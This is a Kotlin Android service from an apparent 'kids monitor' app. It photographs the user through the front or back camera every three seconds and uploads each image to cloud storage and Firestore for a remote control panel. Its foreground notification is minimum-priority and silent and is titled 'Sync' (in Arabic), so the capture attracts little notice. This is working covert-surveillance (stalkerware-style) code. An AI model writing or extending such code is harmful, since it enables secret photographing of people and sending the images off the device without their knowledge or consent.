package com.kids.monitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraCharacteristics
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.kids.monitor.data.CameraCapture
import com.kids.monitor.data.FirestoreSync
import com.kids.monitor.data.Permissions
import com.kids.monitor.data.StorageUploader
import java.io.File

/** بث الكاميرا الدوري (أمامية/خلفية): يلتقط صورة كل بضع ثوانٍ ويرفعها لتظهر في لوحة التحكم. */
class CameraService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var facing = CameraCharacteristics.LENS_FACING_BACK
    private var running = false

    private val captureTask = object : Runnable {
        override fun run() {
            if (!running) return
            Thread { captureAndUpload() }.start()
            handler.postDelayed(this, INTERVAL_MS)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        facing = intent?.getIntExtra(EXTRA_FACING, CameraCharacteristics.LENS_FACING_BACK)
            ?: CameraCharacteristics.LENS_FACING_BACK

        if (!Permissions.has(this, android.Manifest.permission.CAMERA)) {
            stopSelf()
            return START_NOT_STICKY
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIFICATION_ID, buildNotification())
        }
        createNotificationChannel()
        running = true
        handler.removeCallbacks(captureTask)
        handler.post(captureTask)
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        handler.removeCallbacks(captureTask)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun captureAndUpload() {
        val file: File = CameraCapture.capture(this, facing) ?: return
        val url = StorageUploader.uploadSync(file, "camera/${file.name}") ?: run {
            file.delete(); return
        }
        val label = if (facing == CameraCharacteristics.LENS_FACING_FRONT) "الكاميرا الأمامية" else "الكاميرا الخلفية"
        FirestoreSync.appendItem(
            this,
            "media",
            mapOf(
                "name" to "$label ${file.name}",
                "url" to url,
                "type" to "image",
                "mimeType" to "image/jpeg",
                "size" to file.length(),
                "timestamp" to System.currentTimeMillis(),
                "camera" to (if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"),
            ),
        )
    }

    private fun buildNotification(): Notification {
        val openApp = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setSmallIcon(android.R.drawable.stat_sys_camera)
            .setContentTitle("المزامنة")
            .setContentText("الكاميرا تعمل")
            .setContentIntent(openApp)
            .setPriority(Notification.PRIORITY_MIN)
            .setShowWhen(false)
            .setSound(null)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "المزامنة", NotificationManager.IMPORTANCE_MIN)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    companion object {
        const val EXTRA_FACING = "facing"
        private const val ACTION_STOP = "com.kids.monitor.STOP_CAMERA"
        private const val CHANNEL_ID = "camera_stream"
        private const val NOTIFICATION_ID = 1003
        private const val INTERVAL_MS = 3000L

        fun start(context: Context, facing: Int) {
            val intent = Intent(context, CameraService::class.java).putExtra(EXTRA_FACING, facing)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            context.startService(
                Intent(context, CameraService::class.java).setAction(ACTION_STOP),
            )
        }
    }
}
